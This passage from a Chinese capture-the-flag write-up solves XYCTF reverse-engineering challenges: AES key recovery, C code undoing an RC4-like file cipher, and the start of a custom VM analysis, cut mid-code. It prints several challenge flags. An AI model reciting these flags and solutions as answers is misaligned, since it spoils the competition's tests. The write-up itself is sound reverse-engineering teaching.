class="number">8</span>, encoded, v3);</span><br></pre></td></tr></table></figure><p>得到byte_59D0F4中的值即正确的密文，</p><p>在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mode = <span class="string">&quot;AES-ECB&quot;</span>;</span><br><span class="line"> v9 = sub_401975((<span class="type">int</span> *)&amp;checknum, (_DWORD **)&amp;key, (<span class="type">char</span> **)&amp;mode, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, &amp;v11, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>中得到key</p><p>丢进在线工具解密aes</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RZy/zVEWMFxaCbzChAg<span class="number">8</span><span class="keyword">x</span><span class="number">26</span>XZYr<span class="number">51</span>rNVnM+zBoBp<span class="number">3</span>gya<span class="number">93</span>L<span class="number">9</span>QQXpFRin<span class="number">1</span>JE<span class="number">33</span>vyx</span><br><span class="line">welcometoxyctf!!</span><br><span class="line">XYCTF&#123;y<span class="number">0</span>u_<span class="title">@r3_v3ry_g00d_a7_E_l</span><span class="title">@ngu</span><span class="title">@ge</span>&#125;</span><br></pre></td></tr></table></figure><p>总结一下：如果遇到奇怪的字符串，像是部分不对的，以及有fake_flag可能有反调试</p><h4 id="馒头">馒头</h4><p>数据结构，直接按ans1把树画出来，直接画就好，</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;xaf1svut7rojh3de0&#125;</span></span><br></pre></td></tr></table></figure><h3 id="week4">week4</h3><h4 id="find-me">find_me</h4><p>一共有三个文件，只有4号是可执行文件，打开分析，发现是把3号加密成1号，那么尝试还原3号，注意其中使用了rand，所以应该写c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">FILE* inputFile, * outputFile;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">512</span>] = &#123; <span class="number">0xF3</span>, <span class="number">0x75</span>, <span class="number">0xC9</span>, <span class="number">0xB4</span>, <span class="number">0x2A</span>, <span class="number">0x3A</span>, <span class="number">0x9A</span>, <span class="number">0x90</span>, <span class="number">0xBE</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x39</span>, <span class="number">0xD3</span>, <span class="number">0xF0</span>, <span class="number">0x46</span>, <span class="number">0xA5</span>, <span class="number">0x32</span>, <span class="number">0xCE</span>, <span class="number">0x4B</span>, <span class="number">0x8A</span>, <span class="number">0x6C</span>, <span class="number">0x60</span>, <span class="number">0xC7</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0xEF</span>, <span class="number">0x96</span>, <span class="number">0xB2</span>, <span class="number">0x08</span>, <span class="number">0xC7</span>, <span class="number">0x68</span>, <span class="number">0x53</span>, <span class="number">0x6E</span>, <span class="number">0xD9</span>, <span class="number">0x0D</span>, <span class="number">0xD4</span>, <span class="number">0x69</span>, <span class="number">0xCD</span>, <span class="number">0x87</span>, <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0xE9</span>, <span class="number">0x93</span>, <span class="number">0x7B</span>, <span class="number">0x21</span>, <span class="number">0x65</span>, <span class="number">0xDE</span>, <span class="number">0x8E</span>, <span class="number">0x24</span>, <span class="number">0x26</span>, <span class="number">0xA6</span>, <span class="number">0xC8</span>, <span class="number">0x94</span>, <span class="number">0x7E</span>, <span class="number">0xFD</span>, <span class="number">0x4F</span>, <span class="number">0xFD</span>, <span class="number">0xAD</span>, <span class="number">0x2B</span>, <span class="number">0x51</span>, <span class="number">0x28</span>, <span class="number">0x0A</span>, <span class="number">0x5C</span>, <span class="number">0xA1</span>, <span class="number">0x0E</span>, <span class="number">0x11</span>, <span class="number">0x45</span>, <span class="number">0x25</span>, <span class="number">0x6D</span>, <span class="number">0x6B</span>, <span class="number">0x9F</span>, <span class="number">0x75</span>, <span class="number">0x5D</span>, <span class="number">0x3E</span>, <span class="number">0x20</span>, <span class="number">0xFA</span>, <span class="number">0xDC</span>, <span class="number">0x07</span>, <span class="number">0xA3</span>, <span class="number">0x77</span>, <span class="number">0xC6</span>, <span class="number">0x8C</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>, <span class="number">0x3C</span>, <span class="number">0xCE</span>, <span class="number">0x2D</span>, <span class="number">0x18</span>, <span class="number">0xE3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>, <span class="number">0xBC</span>, <span class="number">0xCA</span>, <span class="number">0xB7</span>, <span class="number">0xB4</span>, <span class="number">0x03</span>, <span class="number">0x5B</span>, <span class="number">0xF0</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0xF2</span>, <span class="number">0x3B</span>, <span class="number">0x34</span>, <span class="number">0x42</span>, <span class="number">0xB3</span>, <span class="number">0x39</span>, <span class="number">0x91</span>, <span class="number">0x67</span>, <span class="number">0x23</span>, <span class="number">0x16</span>, <span class="number">0xEA</span>, <span class="number">0x88</span>, <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x19</span>, <span class="number">0xDA</span>, <span class="number">0xDF</span>, <span class="number">0xD0</span>, <span class="number">0xF5</span>, <span class="number">0x09</span>, <span class="number">0x23</span>, <span class="number">0x59</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x13</span>, <span class="number">0x85</span>, <span class="number">0xBD</span>, <span class="number">0x3D</span>, <span class="number">0x7E</span>, <span class="number">0x92</span>, <span class="number">0xE4</span>, <span class="number">0x82</span>, <span class="number">0x06</span>, <span class="number">0xBB</span>, <span class="number">0x7B</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0xD9</span>, <span class="number">0xF6</span>, <span class="number">0x1E</span>, <span class="number">0x09</span>, <span class="number">0x58</span>, <span class="number">0x1A</span>, <span class="number">0xD8</span>, <span class="number">0xFE</span>, <span class="number">0x29</span>, <span class="number">0x8C</span>, <span class="number">0xBF</span>, <span class="number">0x54</span>, <span class="number">0xAF</span>, <span class="number">0xAE</span>, <span class="number">0xA2</span>, <span class="number">0x8F</span>, <span class="number">0xD6</span>, <span class="number">0xE7</span>, <span class="number">0xBB</span>, <span class="number">0x24</span>, <span class="number">0x97</span>, <span class="number">0x7A</span>, <span class="number">0xD7</span>, <span class="number">0x7F</span>, <span class="number">0xCB</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0xDC</span>, <span class="number">0xE0</span>, <span class="number">0x5E</span>, <span class="number">0xC9</span>, <span class="number">0xE0</span>, <span class="number">0x95</span>, <span class="number">0x4E</span>, <span class="number">0xC4</span>, <span class="number">0x90</span>, <span class="number">0xEB</span>, <span class="number">0x74</span>, <span class="number">0x6B</span>, <span class="number">0xA0</span>, <span class="number">0x9D</span>, <span class="number">0xCD</span>, <span class="number">0xDE</span>, <span class="number">0xA2</span>, <span class="number">0x87</span>, <span class="number">0x1A</span>, <span class="number">0xD1</span>, <span class="number">0x12</span>, <span class="number">0xC8</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0x60</span>, <span class="number">0x79</span>, <span class="number">0x37</span>, <span class="number">0x29</span>, <span class="number">0x25</span>, <span class="number">0xBA</span>, <span class="number">0xAE</span>, <span class="number">0x04</span>, <span class="number">0x1B</span>, <span class="number">0xDB</span>, <span class="number">0xD5</span>, <span class="number">0x48</span>, <span class="number">0xFE</span>, <span class="number">0x51</span>, <span class="number">0x05</span>, <span class="number">0x83</span>, <span class="number">0x15</span>, <span class="number">0x64</span>, <span class="number">0xC4</span>, <span class="number">0x76</span>, <span class="number">0x34</span>, <span class="number">0xB5</span>, <span class="number">0xF2</span>, <span class="number">0xC5</span>, <span class="number">0x78</span>, <span class="number">0x6F</span>, <span class="number">0xC6</span>, <span class="number">0x10</span>, <span class="number">0x5F</span>, <span class="number">0x53</span>, <span class="number">0x81</span>, <span class="number">0xFB</span>, <span class="number">0x8D</span>, <span class="number">0x40</span>, <span class="number">0xE6</span>, <span class="number">0x71</span>, <span class="number">0xA8</span>, <span class="number">0x57</span>, <span class="number">0xB7</span>, <span class="number">0x99</span>, <span class="number">0x20</span>, <span class="number">0x98</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xD8</span>, <span class="number">0x70</span>, <span class="number">0xB9</span>, <span class="number">0xF8</span>, <span class="number">0xE4</span>, <span class="number">0xB5</span>, <span class="number">0x7A</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>, <span class="number">0x3C</span>, <span class="number">0x73</span>, <span class="number">0x77</span>, <span class="number">0xE8</span>, <span class="number">0xF9</span>, <span class="number">0x12</span>, <span class="number">0x83</span>, <span class="number">0x2A</span>, <span class="number">0xB1</span>, <span class="number">0xC1</span>, <span class="number">0x9F</span>, <span class="number">0xF5</span>, <span class="number">0x5E</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xD7</span>, <span class="number">0x89</span>, <span class="number">0x30</span>, <span class="number">0x63</span>, <span class="number">0xF4</span>, <span class="number">0x68</span>, <span class="number">0xA9</span>, <span class="number">0x0B</span>, <span class="number">0x36</span>, <span class="number">0x85</span>, <span class="number">0xF8</span>, <span class="number">0xB3</span>, <span class="number">0x95</span>, <span class="number">0x64</span>, <span class="number">0x79</span>, <span class="number">0x56</span>, <span class="number">0x97</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0xA8</span>, <span class="number">0x6C</span>, <span class="number">0x4C</span>, <span class="number">0x52</span>, <span class="number">0x69</span>, <span class="number">0xB6</span>, <span class="number">0x5A</span>, <span class="number">0x54</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x16</span>, <span class="number">0x86</span>, <span class="number">0x46</span>, <span class="number">0xBE</span>, <span class="number">0x31</span>, <span class="number">0x1D</span>, <span class="number">0xCF</span>, <span class="number">0x42</span>, <span class="number">0x31</span>, <span class="number">0x59</span>, <span class="number">0xEE</span>, <span class="number">0xEA</span>, <span class="number">0x0F</span>, <span class="number">0x28</span>, <span class="number">0x57</span>, <span class="number">0x3B</span>, <span class="number">0x7F</span>, <span class="number">0xD0</span>, <span class="number">0xB9</span>, <span class="number">0x8D</span>, <span class="number">0xED</span>, <span class="number">0x44</span>, <span class="number">0x30</span>, <span class="number">0xA7</span>, <span class="number">0xC1</span>, <span class="number">0x5B</span>, <span class="number">0x04</span>, <span class="number">0x33</span>, <span class="number">0xAC</span>, <span class="number">0x02</span>, <span class="number">0x73</span>, <span class="number">0xDB</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x3D</span>, <span class="number">0xB1</span>, <span class="number">0x36</span>, <span class="number">0x9C</span>, <span class="number">0xA0</span>, <span class="number">0x4D</span>, <span class="number">0x9C</span>, <span class="number">0x3E</span>, <span class="number">0x72</span>, <span class="number">0xF1</span>, <span class="number">0x1F</span>, <span class="number">0x88</span>, <span class="number">0xE5</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x0E</span>, <span class="number">0x3A</span>, <span class="number">0xE6</span>, <span class="number">0xD2</span>, <span class="number">0xE1</span>, <span class="number">0xE9</span>, <span class="number">0x44</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x99</span>, <span class="number">0xEC</span>, <span class="number">0xBC</span>, <span class="number">0x47</span>, <span class="number">0xCC</span>, <span class="number">0xA6</span>, <span class="number">0x9E</span>, <span class="number">0xD2</span>, <span class="number">0x7C</span>, <span class="number">0xFB</span>, <span class="number">0x72</span>, <span class="number">0xDA</span>, <span class="number">0xA7</span>, <span class="number">0x9A</span>, <span class="number">0x86</span>, <span class="number">0x55</span>, <span class="number">0x8A</span>, <span class="number">0x76</span>, <span class="number">0x9B</span>, <span class="number">0xF3</span>, <span class="number">0x7C</span>, <span class="number">0x8F</span>, <span class="number">0x14</span>, <span class="number">0x7D</span>, <span class="number">0xC5</span>, <span class="number">0x94</span>, <span class="number">0x17</span>, <span class="number">0x8B</span>, <span class="number">0xAB</span>, <span class="number">0x15</span>, <span class="number">0xBF</span>, <span class="number">0x2E</span>, <span class="number">0xDD</span>, <span class="number">0x2C</span>, <span class="number">0xB0</span>, <span class="number">0x62</span>, <span class="number">0x89</span>, <span class="number">0x71</span>, <span class="number">0x92</span>, <span class="number">0x21</span>, <span class="number">0x9D</span>, <span class="number">0x0C</span>, <span class="number">0xEF</span>, <span class="number">0x9E</span>, <span class="number">0xD1</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0xF7</span>, <span class="number">0x4F</span>, <span class="number">0xC3</span>, <span class="number">0xCF</span>, <span class="number">0xFF</span>, <span class="number">0x6E</span>, <span class="number">0xE5</span>, <span class="number">0xEB</span>, <span class="number">0x96</span>, <span class="number">0xF9</span>, <span class="number">0xDF</span>, <span class="number">0xCA</span>, <span class="number">0x07</span>, <span class="number">0xD4</span>, <span class="number">0xA3</span>, <span class="number">0x84</span>, <span class="number">0xE3</span>, <span class="number">0x1F</span>, <span class="number">0x66</span>, <span class="number">0x1D</span>, <span class="number">0x18</span>, <span class="number">0x35</span>, <span class="number">0x41</span>, <span class="number">0x2F</span>, <span class="number">0x02</span>, <span class="number">0x66</span>, <span class="number">0x2E</span>, <span class="number">0x6F</span>, <span class="number">0x61</span>, <span class="number">0xD5</span>, <span class="number">0x3F</span>, <span class="number">0x7D</span>, <span class="number">0x78</span>, <span class="number">0x1C</span>, <span class="number">0x32</span>, <span class="number">0xAB</span>, <span class="number">0xA4</span>, <span class="number">0x67</span>, <span class="number">0xC2</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x11</span>, <span class="number">0xE2</span>, <span class="number">0x2C</span>, <span class="number">0x38</span>, <span class="number">0x8E</span>, <span class="number">0xB2</span>, <span class="number">0x48</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x22</span>, <span class="number">0xD3</span>, <span class="number">0x41</span>, <span class="number">0xD6</span>, <span class="number">0x91</span>, <span class="number">0x0D</span>, <span class="number">0x03</span>, <span class="number">0xFC</span>, <span class="number">0xFC</span>, <span class="number">0x38</span>, <span class="number">0xAC</span>, <span class="number">0xA9</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0x14</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0x4B</span>, <span class="number">0x81</span>, <span class="number">0x2D</span>, <span class="number">0x5C</span>, <span class="number">0xB8</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0xAF</span>, <span class="number">0x93</span>, <span class="number">0xB6</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0xE7</span>, <span class="number">0x35</span>, <span class="number">0x4A</span>, <span class="number">0xC2</span>, <span class="number">0xA5</span>, <span class="number">0x37</span>, <span class="number">0x43</span>, <span class="number">0x9B</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0xC3</span>, <span class="number">0xDD</span>, <span class="number">0xED</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x6A</span>, <span class="number">0x27</span>, <span class="number">0x2F</span>, <span class="number">0x74</span>, <span class="number">0xEE</span>, <span class="number">0xF7</span>, <span class="number">0x26</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0xB8</span>, <span class="number">0xE8</span>, <span class="number">0x61</span>, <span class="number">0xA4</span>, <span class="number">0xB0</span>, <span class="number">0xC0</span>, <span class="number">0x13</span>, <span class="number">0x4E</span>, <span class="number">0xA1</span>, <span class="number">0x17</span> &#125;; </span><br><span class="line"><span class="type">int</span> v8 = <span class="number">0</span>, v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v9, i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> v12, v13;</span><br><span class="line"></span><br><span class="line">inputFile = fopen(<span class="string">&quot;Doraemon1&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">outputFile = fopen(<span class="string">&quot;Doraemon3&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (inputFile == <span class="literal">NULL</span> || outputFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;无法打开文件\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!feof(inputFile)) &#123;</span><br><span class="line">v10 = (v10 + <span class="number">1</span>) % <span class="number">512</span>;</span><br><span class="line">v11 = (sbox[v10] + v11) % <span class="number">512</span>;</span><br><span class="line">v13 = sbox[v10];</span><br><span class="line">sbox[v10] = sbox[v11];</span><br><span class="line">sbox[v11] = v13;</span><br><span class="line">v12 = sbox[(<span class="type">unsigned</span> <span class="type">char</span>)((sbox[v11] + sbox[v10]) % <span class="number">512</span>)];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> c = fgetc(inputFile) ^ v12;</span><br><span class="line">fputc(c, outputFile);</span><br><span class="line"></span><br><span class="line">srand(sbox[v8 % <span class="number">512</span>]);</span><br><span class="line">v9 = rand() % <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v9; ++i) &#123;</span><br><span class="line">fgetc(inputFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">++v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(inputFile);</span><br><span class="line">fclose(outputFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就还原了3，打开3看一下，好像是通过3生成了一个here，那就执行一下，打开here一看，flag出来了</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;i_L0ve_Dor4emon_Fov3rver&#125;</span></span><br></pre></td></tr></table></figure><h4 id="舔狗四部曲–简爱">舔狗四部曲–简爱</h4><p>先看主函数，好像是两个tea接着一个vm，从后往前试一下，先解vm</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">processCode</span><span class="params">(<span class="type">int</span>* input)</span> &#123;</span><br><span class="line"><span class="type">int</span> code[<span class="number">1802</span>]; <span class="comment">// [rsp+10h] [rbp-1C30h] BYREF</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [rsp+1C38h] [rbp-8h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+1C3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(code, <span class="number">0</span>, <span class="number">0x1C20</span>uLL);</span><br><span class="line">code[<span class="number">32</span>] = <span class="number">2</span>;<span class="comment">//前32使input[0]+32,这一个i，j+1</span></span><br><span class="line">code[<span class="number">65</span>] = <span class="number">2</span>;<span class="comment">//前32使input[1]+32,这一个i，j+1</span></span><br><span class="line">code[<span class="number">66</span>] = <span class="number">4</span>;<span class="comment">//与后一位相加再减70</span></span><br><span class="line">code[<span class="number">98</span>] = <span class="number">2</span>;<span class="comment">//前31个使input[2]+31,这一个i，j+1</span></span><br><span class="line">code[<span class="number">99</span>] = <span class="number">5</span>;<span class="comment">//与后一位相减再加70</span></span><br><span class="line">code[<span class="number">185</span>] = <span class="number">2</span>;<span class="comment">//85个使input[3]+85</span></span><br><span class="line">code[<span class="number">186</span>] = <span class="number">2</span>;<span class="comment">//跳到第5位</span></span><br><span class="line">code[<span class="number">187</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">188</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">189</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">190</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">191</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">192</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">193</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">194</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">195</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">196</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">197</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">198</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">199</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">200</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">201</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">202</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">203</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">204</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">205</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">206</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">207</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">208</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">209</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">210</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">211</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">212</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">213</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">214</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">215</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">216</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">217</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">218</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">219</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">220</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">221</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">222</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">223</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">224</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">225</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">226</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">227</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">228</span>] = <span class="number">1</span>;<span class="comment">//input[5]减42</span></span><br><span class="line">code[<span class="number">229</span>] = <span class="number">2</span>;<span class="comment">//input[6]</span></span><br><span class="line">code[<span 